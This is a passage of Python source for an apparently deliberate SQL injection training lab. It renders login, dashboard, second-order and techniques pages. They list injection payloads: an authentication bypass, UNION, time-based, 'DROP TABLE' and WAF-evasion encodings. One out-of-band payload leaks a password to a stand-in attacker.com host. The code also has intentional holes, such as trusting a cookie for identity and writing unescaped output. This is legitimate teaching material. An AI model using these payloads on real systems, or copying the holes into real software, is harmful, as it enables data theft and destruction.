                                <button type="button" class="example-payload-btn" onclick="setPayload(&quot;' OR '1'='1' --&quot;)">Basic Bypass</button>
                                <button type="button" class="example-payload-btn" onclick="setPayload(&quot;' UNION SELECT 1,2,3,4,5,6,7,8 --&quot;)">Union</button>
                                <button type="button" class="example-payload-btn" onclick="setPayload(&quot;'; DROP TABLE users --&quot;)">Drop Table</button>
                                <button type="button" class="example-payload-btn" onclick="setPayload(&quot;' AND SLEEP(5) --&quot;)">Time-Based</button>
                            </div>
                        </form>
                    </div>
                    
                    <div id="resultBox" class="result-box">
                        <h4 id="resultTitle">Result</h4>
                        <p id="resultMessage"></p>
                        <code id="resultCode"></code>
                    </div>
                    
                    <div class="payload-list">
                        <h3 style="padding:15px 20px;color:#00ffff;margin:0;border-bottom:1px solid #30363d;">
                            Stored Payloads (Second-Order)
                        </h3>
        """
        
        if stored_payloads:
            html += """
                        <table>
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Payload</th>
                                    <th>Username</th>
                                    <th>Status</th>
                                    <th>Created</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
            """
            for idx, payload_data in enumerate(stored_payloads, 1):
                status_class = "status-executed" if payload_data.get('executed', False) else "status-pending"
                status_text = "Executed" if payload_data.get('executed', False) else "Pending"
                disabled = "disabled" if payload_data.get('executed', False) else ""
                
                html += f"""
                                <tr>
                                    <td>{idx}</td>
                                    <td><code style="background:#0d1117;padding:2px 8px;border-radius:3px;color:#ffcc00;font-size:12px;">{payload_data['payload'][:50]}{'...' if len(payload_data['payload']) > 50 else ''}</code></td>
                                    <td>{payload_data['username']}</td>
                                    <td><span class="payload-status {status_class}">{status_text}</span></td>
                                    <td style="font-size:12px;color:#888;">{payload_data.get('created_at', datetime.now()).strftime('%H:%M:%S %Y-%m-%d') if hasattr(payload_data.get('created_at', None), 'strftime') else 'Just now'}</td>
                                    <td>
                                        <button onclick="executePayload({idx})" class="execute-btn" {disabled}>
                                            Execute
                                        </button>
                                    </td>
                                </tr>
                """
            html += """
                            </tbody>
                        </table>
            """
        else:
            html += """
                        <div style="padding:30px;text-align:center;color:#888;">
                            <p style="font-size:16px;">No payloads stored yet.</p>
                            <p style="font-size:13px;">Use the form above to store your first second-order payload!</p>
                        </div>
            """
        
        html += f"""
                    </div>
                    
                    <div style="margin-top:30px;padding:20px;background:#161b22;border-radius:10px;border:1px solid #30363d;">
                        <h3 style="color:#ffcc00;margin-bottom:10px;">Challenge</h3>
                        <p style="color:#c9d1d9;">Try these second-order injection challenges:</p>
                        <ol style="padding-left:20px;color:#c9d1d9;line-height:1.8;">
                            <li>Store a basic authentication bypass payload: <code style="background:#0d1117;padding:2px 8px;border-radius:3px;color:#ffcc00;">' OR '1'='1' --</code></li>
                            <li>Store a UNION-based payload: <code style="background:#0d1117;padding:2px 8px;border-radius:3px;color:#ffcc00;">' UNION SELECT 1,2,3,4,5,6,7,8 --</code></li>
                            <li>Execute the stored payload and see if it works!</li>
                            <li>Try a more destructive payload: <code style="background:#0d1117;padding:2px 8px;border-radius:3px;color:#ffcc00;">'; DROP TABLE products --</code></li>
                        </ol>
                        <div style="margin-top:15px;padding:15px;background:#0d1117;border-radius:8px;border-left:3px solid #00ffff;">
                            <p style="color:#00ffff;font-size:13px;">
                                <strong>Tip:</strong> The payload is stored in the database and only executes when retrieved. 
                                This simulates real-world scenarios where malicious data is stored and later used in vulnerable queries.
                            </p>
                        </div>
                    </div>
                    
                    <div style="margin-top:20px;text-align:center;">
                        <button onclick="location.href='/download-pdf'" class="pdf-download-btn" style="padding:12px 40px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;">
                            Download PDF Notes
                        </button>
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
            
            <script>
                function setPayload(payload) {{
                    document.querySelector('textarea[name="payload"]').value = payload;
                    document.querySelector('textarea[name="payload"]').focus();
                }}
                
                function executePayload(id) {{
                    // Show result box
                    const resultBox = document.getElementById('resultBox');
                    const resultTitle = document.getElementById('resultTitle');
                    const resultMessage = document.getElementById('resultMessage');
                    const resultCode = document.getElementById('resultCode');
                    
                    resultBox.className = 'result-box';
                    resultBox.style.display = 'block';
                    
                    // Find the payload in the list
                    const rows = document.querySelectorAll('.payload-list tbody tr');
                    if (rows && rows.length >= id) {{
                        const row = rows[id - 1];
                        const payloadCell = row.querySelector('td:nth-child(2)');
                        if (payloadCell) {{
                            const payload = payloadCell.textContent.trim();
                            
                            // Send test injection request
                            fetch('/test_injection', {{
                                method: 'POST',
                                headers: {{
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                }},
                                body: 'technique=second_order&payload=ID:' + id
                            }})
                            .then(response => response.text())
                            .then(html => {{
                                if (html.includes('Success')) {{
                                    resultBox.className = 'result-box success';
                                    resultTitle.textContent = 'Execution Successful!';
                                    resultMessage.innerHTML = 'The stored payload executed successfully! The injection worked because the application used the stored data in a vulnerable query.';
                                }} else {{
                                    resultBox.className = 'result-box error';
                                    resultTitle.textContent = 'Execution Failed';
                                    resultMessage.innerHTML = 'The stored payload did not execute. This could be because:<br>- The application is using secure queries<br>- The payload syntax is incorrect<br>- The payload was already executed';
                                }}
                                resultCode.textContent = 'Payload: ' + payload;
                                
                                // Update status in table
                                const statusCell = row.querySelector('td:nth-child(4) span');
                                if (statusCell) {{
                                    statusCell.className = 'payload-status status-executed';
                                    statusCell.textContent = 'Executed';
                                }}
                                const actionBtn = row.querySelector('td:last-child button');
                                if (actionBtn) {{
                                    actionBtn.disabled = true;
                                    actionBtn.textContent = 'Done';
                                }}
                                
                                // Scroll to result
                                resultBox.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
                            }})
                            .catch(error => {{
                                resultBox.className = 'result-box error';
                                resultTitle.textContent = 'Error';
                                resultMessage.textContent = 'Error executing payload: ' + error.message;
                                resultCode.textContent = 'Payload: ' + payload;
                            }});
                        }}
                    }}
                }}
                
                // Check for URL parameters on load
                window.onload = function() {{
                    const urlParams = new URLSearchParams(window.location.search);
                    const result = urlParams.get('result');
                    const message = urlParams.get('message');
                    if (result && message) {{
                        const resultBox = document.getElementById('resultBox');
                        const resultTitle = document.getElementById('resultTitle');
                        const resultMessage = document.getElementById('resultMessage');
                        
                        resultBox.style.display = 'block';
                        if (result === 'success') {{
                            resultBox.className = 'result-box success';
                            resultTitle.textContent = 'Payload Stored Successfully!';
                            resultMessage.textContent = message;
                        }} else {{
                            resultBox.className = 'result-box error';
                            resultTitle.textContent = 'Error Storing Payload';
                            resultMessage.textContent = message;
                        }}
                        
                        resultBox.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
                    }}
                }};
            </script>
        </body>
        </html>
        """
        
        self._send_html(html)
    
    def _handle_store_payload(self, params):
        payload = params.get('payload', [''])[0]
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        
        if not payload or len(payload.strip()) == 0:
            self._send_error(400, "Please enter a payload")
            return
        
        # Get current user from cookie
        username = 'admin'
        cookies = self.headers.get('Cookie', '')
        for cookie in cookies.split(';'):
            if 'username=' in cookie:
                username = cookie.split('=')[1].strip()
                break
        
        # Store the payload
        lab.store_second_order_payload(payload, username)
        lab.add_audit_log(username, f"Stored second-order payload: {payload[:50]}...")
        
        # Redirect with success message
        self.send_response(302)
        self.send_header('Location', f'/second-order?result=success&message=Payload+stored+successfully:+{urllib.parse.quote(payload[:50])}')
        self.end_headers()
    
    def _get_enhanced_techniques_html(self) -> str:
        html = """
        <div class="techniques-grid">
        """
        
        for tech_id, tech_data in ADVANCED_SQL_INJECTION_TECHNIQUES.items():
            html += f"""
            <div class="technique-card">
                <div class="technique-header">
                    <h4>{tech_data['name']}</h4>
                    <span class="tech-badge">{len(tech_data['payloads'])} payloads</span>
                    <span class="mitre-badge">{tech_data['mitre_id']}</span>
                </div>
                <div class="technique-body">
                    <p><b>Category:</b> {tech_data['category']}</p>
                    <p>{tech_data['description']}</p>
                    <div class="tech-example">
                        <code>{tech_data['example']}</code>
                    </div>
                    <details class="tech-details">
                        <summary>How it works</summary>
                        <p>{tech_data['explanation']}</p>
                    </details>
                    <details class="tech-details">
                        <summary>WAF Bypass Payloads</summary>
                        <ul>
            """
            if 'waf_bypass_payloads' in tech_data:
                for payload in tech_data['waf_bypass_payloads'][:3]:
                    html += f"<li><code class='payload-code'>{payload}</code></li>"
                if len(tech_data['waf_bypass_payloads']) > 3:
                    html += f"<li class='more-payloads'>... and {len(tech_data['waf_bypass_payloads']) - 3} more</li>"
            html += """
                        </ul>
                    </details>
                    <details class="tech-details">
                        <summary>Detection Indicators</summary>
                        <ul>
            """
            if 'detection_indicators' in tech_data:
                for indicator in tech_data['detection_indicators']:
                    html += f"<li>{indicator}</li>"
            html += """
                        </ul>
                    </details>
                    <button onclick="testPayload('""" + tech_id + """', '""" + tech_data['example'].replace("'", "\\'") + """')" class="test-btn">
                        Test This Payload
                    </button>
                </div>
            </div>
            """
        
        html += """
        </div>
        <script>
        function testPayload(technique, payload) {
            fetch('/test_injection', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'technique=' + encodeURIComponent(technique) + '&payload=' + encodeURIComponent(payload)
            })
            .then(response => response.text())
            .then(html => {
                const modal = document.createElement('div');
                modal.className = 'modal-overlay';
                modal.innerHTML = `
                    <div class="modal-content">
                        <div class="modal-header">
                            <h2>Injection Test Result</h2>
                            <button onclick="this.closest('.modal-overlay').remove()">X</button>
                        </div>
                        <div class="modal-body">
                            ${html}
                        </div>
                    </div>
                `;
                document.body.appendChild(modal);
            });
        }
        </script>
        """
        return html
    
    def _get_waf_bypass_html(self) -> str:
        html = """
        <div class="waf-bypass-grid">
        """
        
        for bypass_id, bypass_data in WAF_BYPASS_TECHNIQUES.items():
            html += f"""
            <div class="technique-card">
                <div class="technique-header">
                    <h4>WAF Bypass: {bypass_data['name']}</h4>
                </div>
                <div class="technique-body">
                    <p>{bypass_data['description']}</p>
                    <div class="tech-example">
                        <h5>Examples:</h5>
                        <ul>
            """
            for example in bypass_data['examples'][:3]:
                html += f"<li><code class='payload-code'>{example}</code></li>"
            if len(bypass_data['examples']) > 3:
                html += f"<li class='more-payloads'>... and {len(bypass_data['examples']) - 3} more</li>"
            html += f"""
                        </ul>
                    </div>
                    <div class="tech-details">
                        <p><b>Detection:</b> {bypass_data['detection']}</p>
                    </div>
                </div>
            </div>
            """
        
        html += "</div>"
        return html
    
    def _get_enhanced_learning_content(self, show: bool) -> str:
        if not show:
            return ""
        
        html = """
        <div class="learning-panel" style="margin-bottom: 20px;">
            <div class="learning-header">
                <h2>SQL Injection Learning Center</h2>
                <button onclick="location.href='/toggle-learning'" class="close-learning" style="background: #ff555544; color: #ff5555; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer; font-size: 18px;">
                    X Hide
                </button>
            </div>
            <div style="padding: 20px;">
        """
        
        # Add all learning content sections
        learning_sections = [
            {
                'title': 'What is SQL Injection?',
                'content': 'SQL Injection is a code injection technique that exploits vulnerabilities in web applications by inserting malicious SQL statements into input fields.',
                'example': "Example: ' OR '1'='1' --",
                'explanation': 'This payload bypasses authentication by making the WHERE clause always true.'
            },
            {
                'title': 'Common Techniques',
                'content': 'Here are some common SQL injection techniques you can practice:',
                'items': [
                    ("Basic Authentication Bypass", "' OR '1'='1' --"),
                    ("Union-Based Extraction", "' UNION SELECT 1,2,3,4,5,6,7,8 --"),
                    ("Time-Based Blind Injection", "' AND SLEEP(5) --"),
                    ("Error-Based Injection", "' AND 1=CONVERT(int, @@version) --"),
                    ("Stacked Queries", "'; DROP TABLE users --")
                ]
            },
            {
                'title': 'WAF Bypass Techniques',
                'content': 'Learn how attackers bypass Web Application Firewalls:',
                'items': [
                    ("Comment Obfuscation", "SELECT/**/1,2,3/**/FROM/**/users"),
                    ("Case Manipulation", "' Or 1=1 --"),
                    ("Encoding Evasion", "'%4f%52%20%27%31%27%3d%27%31%27'"),
                    ("Null Byte Injection", "'%00 OR 1=1 --")
                ]
            },
            {
                'title': 'MITRE ATT&CK Framework',
                'content': 'SQL injection techniques mapped to MITRE ATT&CK:',
                'items': [
                    ("T1190", "Exploit Public-Facing Application"),
                    ("T1505.001", "SQL Stored Procedures"),
                    ("T1048", "Exfiltration Over Alternative Protocol"),
                    ("T1204.002", "Malicious File Execution")
                ]
            },
            {
                'title': 'Detection Indicators',
                'content': 'Signs that SQL injection might be occurring:',
                'items': [
                    ("Query errors containing database details"),
                    ("Unusual OR/AND conditions in logs"),
                    ("Abnormal response times"),
                    ("UNION or DROP keywords in queries")
                ]
            }
        ]
        
        for section in learning_sections:
            html += f"""
            <div class="learning-section">
                <h3>{section['title']}</h3>
                <p>{section['content']}</p>
            """
            
            if 'items' in section:
                html += '<ul style="list-style: none; padding: 0;">'
                for item in section['items']:
                    if isinstance(item, tuple) and len(item) == 2:
                        if section['title'].startswith('Detection') or section['title'].startswith('MITRE'):
                            html += f'<li style="padding: 5px 0; color: #c9d1d9;">- <strong>{item[0]}</strong> - {item[1]}</li>'
                        else:
                            html += f'<li style="padding: 5px 0; color: #c9d1d9;">- <code style="background: #0d1117; padding: 2px 8px; border-radius: 3px; color: #ffcc00;">{item[1]}</code> - {item[0]}</li>'
                html += '</ul>'
            
            if 'example' in section:
                html += f"""
                <div class="example-box">
                    <code>{section['example']}</code>
                    <div class="explanation">{section.get('explanation', '')}</div>
                </div>
                """
            
            html += '</div>'
        
        # Add PDF download button in learning center
        html += """
            <div class="learning-section" style="border-top: 1px solid #30363d; padding-top: 20px; text-align: center;">
                <button onclick="location.href='/download-pdf'" class="pdf-download-btn" style="padding: 12px 40px; background: linear-gradient(135deg, #ff8800, #ff5500); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer;">
                    Download Complete PDF Notes
                </button>
                <p style="color: #888; margin-top: 10px; font-size: 13px;">Get all techniques, WAF bypass methods, and MITRE mapping in one PDF</p>
            </div>
        """
        
        html += """
            </div>
        </div>
        """
        
        return html

        
    def _get_injection_history_html(self) -> str:
        lab = self.lab_instance
        if lab is None:
            return "<p>Lab not initialized</p>"
        
        attempts = lab.get_injection_attempts(20)
        if not attempts:
            return "<p>No injection attempts recorded yet. Try some SQL injection techniques!</p>"
        
        html = """
        <table class="injection-history-table">
            <tr>
                <th>Technique</th>
                <th>Payload</th>
                <th>User</th>
                <th>Success</th>
                <th>WAF Blocked</th>
                <th>Response Time</th>
                <th>Time</th>
            </tr>
        """
        for attempt in attempts:
            success_class = "success-badge" if attempt['success'] else "fail-badge"
            success_text = "Yes" if attempt['success'] else "No"
            waf_text = "Yes" if attempt['waf_blocked'] else "No"
            html += f"""
            <tr>
                <td><span class="tech-badge">{attempt['technique']}</span></td>
                <td><code class="payload-code">{attempt['payload'][:50]}{'...' if len(attempt['payload']) > 50 else ''}</code></td>
                <td>{attempt['username']}</td>
                <td class="{success_class}">{success_text}</td>
                <td>{waf_text}</td>
                <td style="font-size:12px;color:#888;">{attempt['response_time']:.3f}s</td>
                <td style="font-size:12px;color:#888;">{attempt['timestamp']}</td>
            </tr>
            """
        html += "</table>"
        return html
    
    def _serve_login_form(self, error: str = "", message: str = ""):
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        
        users = lab.get_users() if lab else []
        show_learning = lab.show_learning if lab else False
        waf_mode = lab.waf_mode if lab else False
        
        user_list_html = ""
        if users:
            user_list_html = """
            <div class="user-list-hint">
                <h4>Available Users</h4>
                <table class="user-hint-table">
                    <tr><th>Username</th><th>Role</th><th>Department</th></tr>
            """
            for user in users[:10]:
                user_list_html += f"""
                    <tr>
                        <td><span class="username">{user['username']}</span></td>
                        <td><span class="role">{user['role']}</span></td>
                        <td><span class="dept">{user['department']}</span></td>
                    </tr>
                """
            if len(users) > 10:
                user_list_html += f"<tr><td colspan='3' style='text-align:center;color:#888;'>... and {len(users) - 10} more users</td></tr>"
            user_list_html += """
                </table>
                <p class="small">Try SQL injection on any user account!</p>
            </div>
            """
        
        error_html = f'<p style="color: #ff5555; text-align: center;">{error}</p>' if error else ''
        message_html = f'<p style="color: #00ff88; text-align: center;">{message}</p>' if message else ''
        
        waf_status = "WAF: ENABLED" if waf_mode else "WAF: DISABLED"
        waf_color = "#00ff88" if waf_mode else "#ff5555"
        
        learning_content = self._get_enhanced_learning_content(show_learning)
        learning_toggle = "Hide Learning Center" if show_learning else "Show Learning Center"
                
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Advanced SQL Injection Learning Lab</title>
            <link rel="stylesheet" href="/styles.css">
            <style>
            .waf-status {{
                text-align: center;
                padding: 10px;
                background: #161b22;
                border-radius: 5px;
                margin: 10px 0;
                border: 1px solid {waf_color};
            }}
            .waf-status span {{
                color: {waf_color};
                font-weight: bold;
            }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Advanced SQL Injection Learning Lab</h1>
                    <p class="subtitle">DSTERMINAL Enterprise Edition v4.0 - Complete SQL Injection Lab</p>
                    <div class="header-controls">
                        <button onclick="location.href='/toggle-learning'" class="learning-toggle-btn">
                            {learning_toggle}
                        </button>
                        <button onclick="location.href='/download-pdf'" class="pdf-download-btn">
                            Download PDF Notes
                        </button>
                        <button onclick="location.href='/waf-toggle?mode={'disable' if waf_mode else 'enable'}'" 
                                class="{'waf-toggle-btn' if waf_mode else 'waf-toggle-btn-off'}">
                            {'Disable WAF' if waf_mode else 'Enable WAF'}
                        </button>
                    </div>
                    <div class="waf-status">
                        Status: <span>{waf_status}</span>
                    </div>
                </div>
                
                {learning_content}
                
                <div class="login-box">
                    <h2>Login</h2>
                    {error_html}
                    {message_html}
                    <p class="info">Try SQL injection techniques to bypass authentication!</p>
                    
                    <form method="POST" action="/login">
                        <div class="form-group">
                            <label>Username:</label>
                            <input type="text" name="username" placeholder="Enter username" required>
                        </div>
                        <div class="form-group">
                            <label>Password:</label>
                            <input type="password" name="password" placeholder="Enter password" required>
                        </div>
                        <button type="submit">Login</button>
                    </form>
                    
                    <div class="hint">
                        <p>Try these SQL injection techniques:</p>
                        <ul style="list-style:none;padding:0;margin-top:5px;">
                            <li>- <code>' OR '1'='1' --</code> (Basic bypass)</li>
                            <li>- <code>' UNION SELECT 1,2,3,4,5,6,7,8 --</code> (Union-based)</li>
                            <li>- <code>' AND SLEEP(5) --</code> (Time-based)</li>
                            <li>- <code>'; DROP TABLE users --</code> (Stacked queries)</li>
                            <li>- <code>' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test')) --</code> (Out-of-band)</li>
                        </ul>
                    </div>
                </div>
                
                {user_list_html}
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_dashboard(self, params):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        
        username = 'admin'
        for cookie in cookies.split(';'):
            if 'username=' in cookie:
                username = cookie.split('=')[1].strip()
                break
        
        user = lab.get_user_by_username(username) if lab else None
        
        if not user and lab:
            users = lab.get_users()
            if users:
                user = users[0]
                username = user['username']
        
        if not user:
            self._send_error(401, "User not found")
            return
        
        products = lab.get_user_products(user['id']) if lab else []
        orders = lab.get_user_orders(user['id']) if lab else []
        secure_mode = lab.secure_mode if lab else False
        waf_mode = lab.waf_mode if lab else False
        
        total_orders = len(orders)
        total_spent = sum(o['total'] for o in orders) if orders else 0
        pending_orders = sum(1 for o in orders if o['status'] == 'pending')
        
        # Determine status display
        status_color = "#00ff88" if secure_mode else "#ff5555"
        status_text = "SECURE" if secure_mode else "VULNERABLE"
        status_message = "SQL injection is PREVENTED (parameterized queries)" if secure_mode else "SQL injection is POSSIBLE (vulnerable)"
        status_icon = "[+]" if secure_mode else "[!]"
        toggle_text = "Disable Secure Mode" if secure_mode else "Enable Secure Mode"
        toggle_mode = "disable" if secure_mode else "enable"
        toggle_class = "btn-vulnerable" if secure_mode else "btn-secure"
        
        waf_status_color = "#00ff88" if waf_mode else "#ff5555"
        waf_status_text = "ENABLED" if waf_mode else "DISABLED"
        waf_toggle_text = "Disable WAF" if waf_mode else "Enable WAF"
        waf_toggle_mode = "disable" if waf_mode else "enable"
        waf_toggle_class = "btn-vulnerable" if waf_mode else "btn-secure"
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Dashboard - {username}</title>
            <link rel="stylesheet" href="/styles.css">
            <style>
                .status-banner {{
                    padding: 20px;
                    background: #161b22;
                    border-radius: 10px;
                    border: 2px solid {status_color};
                    text-align: center;
                    margin-bottom: 20px;
                }}
                .status-banner h3 {{
                    color: {status_color};
                    margin-bottom: 5px;
                }}
                .status-banner p {{
                    color: #c9d1d9;
                    margin: 5px 0;
                }}
                .status-banner .status-icon {{
                    font-size: 2em;
                    display: block;
                    margin-bottom: 10px;
                }}
                .btn-secure {{
                    background: #00ff88;
                    color: #0d1117;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    font-size: 14px;
                    width: auto;
                    transition: all 0.3s;
                }}
                .btn-secure:hover {{
                    transform: scale(1.05);
                    box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
                }}
                .btn-vulnerable {{
                    background: #ff5555;
                    color: #fff;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    font-size: 14px;
                    width: auto;
                    transition: all 0.3s;
                }}
                .btn-vulnerable:hover {{
                    transform: scale(1.05);
                    box-shadow: 0 0 20px rgba(255, 85, 85, 0.3);
                }}
                .query-display {{
                    margin-top: 15px;
                    padding: 15px;
                    background: #0d1117;
                    border-radius: 8px;
                    border: 1px solid #30363d;
                    text-align: left;
                }}
                .query-display code {{
                    display: block;
                    padding: 10px;
                    background: #1a1a2e;
                    border-radius: 5px;
                    color: #00ff88;
                    font-family: 'Consolas', monospace;
                    font-size: 13px;
                    overflow-x: auto;
                    margin-top: 5px;
                }}
                .query-label {{
                    color: #888;
                    font-size: 12px;
                    margin-bottom: 5px;
                }}
                .waf-status-banner {{
                    padding: 15px;
                    background: #161b22;
                    border-radius: 10px;
                    border: 2px solid {waf_status_color};
                    text-align: center;
                    margin-bottom: 20px;
                }}
                .waf-status-banner h3 {{
                    color: {waf_status_color};
                    margin-bottom: 5px;
                }}
                .control-buttons {{
                    display: flex;
                    gap: 10px;
                    flex-wrap: wrap;
                    justify-content: center;
                    margin-top: 10px;
                }}
                .control-buttons button {{
                    width: auto;
                    padding: 10px 20px;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>User Dashboard</h1>
                    <p class="subtitle">Welcome, <strong>{username}</strong>! ({user['role']})</p>
                    <p class="subtitle" style="font-size:0.8em;color:#666;">{user['email']} | {user['department']}</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard" class="active">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/second-order">Second-Order</a>
                    <a href="/techniques">Techniques</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="dashboard-content">
                    <div class="waf-status-banner">
                        <h3>WAF Status: {waf_status_text}</h3>
                        <p style="color:#c9d1d9;">Web Application Firewall is {'ACTIVE and blocking injection attempts' if waf_mode else 'DISABLED - injection attempts will reach the application'}</p>
                        <div class="control-buttons">
                            <button onclick="location.href='/waf-toggle?mode={waf_toggle_mode}'" class="{waf_toggle_class}">
                                {waf_toggle_text}
                            </button>
                        </div>
                    </div>
                    
                    <div class="status-banner">
                        <span class="status-icon">{status_icon}</span>
                        <h3>Security Status: {status_text}</h3>
                        <p>{status_message}</p>
                        <div style="margin-top: 15px;">
                            <button onclick="location.href='/secure_login?mode={toggle_mode}'" class="{toggle_class}">
                                {toggle_text}
                            </button>
                        </div>
                        <div class="query-display">
                            <div class="query-label">Current Query Method:</div>
                            <code>{'Parameterized Query (Secure)' if secure_mode else 'String Concatenation (Vulnerable)'}</code>
                            <div style="margin-top: 10px; font-size: 12px; color: #666;">
                                {'SQL injection is blocked' if secure_mode else 'SQL injection is possible'}
                            </div>
                        </div>
                    </div>
                    
                    <div class="stats-grid">
                        <div class="stat-card">
                            <h3>My Products</h3>
                            <div class="stat-number">{len(products)}</div>
                        </div>
                        <div class="stat-card">
                            <h3>Total Orders</h3>
                            <div class="stat-number">{total_orders}</div>
                        </div>
                        <div class="stat-card">
                            <h3>Total Spent</h3>
                            <div class="stat-number">${total_spent:.2f}</div>
                        </div>
                        <div class="stat-card">
                            <h3>Pending Orders</h3>
                            <div class="stat-number">{pending_orders}</div>
                        </div>
                    </div>
                    
                    <div class="admin-section">
                        <h3>Admin Controls</h3>
                        <p>Change admin credentials:</p>
                        <form method="POST" action="/update_credentials">
                            <div class="form-group inline">
                                <input type="text" name="new_username" placeholder="New admin username" required>
                                <input type="password" name="new_password" placeholder="New admin password" required>
                                <button type="submit">Update Admin Credentials</button>
                            </div>
                        </form>
                    </div>
                    
                    <div class="lab-section">
                        <h3>Lab Controls</h3>
                        <div class="lab-controls">
                            <button onclick="location.href='/secure_login?mode=enable'" class="btn-secure" style="{'display: none;' if secure_mode else ''}">Enable Secure Mode</button>
                            <button onclick="location.href='/secure_login?mode=disable'" class="btn-vulnerable" style="{'display: none;' if not secure_mode else ''}">Disable Secure Mode</button>
                            <button onclick="if(confirm('Reset database to initial state?')) location.href='/reset'" class="btn-reset">Reset Database</button>
                            <button onclick="location.href='/techniques'" class="btn-learning">View Techniques</button>
                            <button onclick="location.href='/second-order'" class="btn-second-order">Second-Order Lab</button>
                            <button onclick="location.href='/download-pdf'" class="btn-pdf">Download PDF Notes</button>
                        </div>
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_products(self, params):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        username = 'admin'
        for cookie in cookies.split(';'):
            if 'username=' in cookie:
                username = cookie.split('=')[1].strip()
                break
        
        lab = self.lab_instance
        user = lab.get_user_by_username(username) if lab else None
        
        if not user:
            self._send_error(401, "User not found")
            return
        
        products = lab.get_user_products(user['id']) if lab else []
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>My Products - Advanced SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>My Products</h1>
                    <p class="subtitle">Products owned by """ + username + """</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products" class="active">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/second-order">Second-Order</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="product-list">
                        <h3>Your Products</h3>
        """
        
        if products:
            html += "<table class='product-table'>"
            html += "<tr><th>ID</th><th>Name</th><th>Price</th><th>Description</th><th>Stock</th><th>Category</th><th>Sub-Category</th><th>Featured</th></tr>"
            for product in products:
                featured = "Yes" if product['is_featured'] else "No"
                html += f"<tr><td>{product['id']}</td><td>{product['name']}</td><td>${product['price']}</td><td>{product['description']}</td><td>{product['stock']}</td><td>{product['category']}</td><td>{product['sub_category']}</td><td>{featured}</td></tr>"
            html += "</table>"
        else:
            html += "<p>No products found for this user.</p>"
        
        html += """
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_all_products(self):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        products = lab.get_all_products() if lab else []
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>All Products - Advanced SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
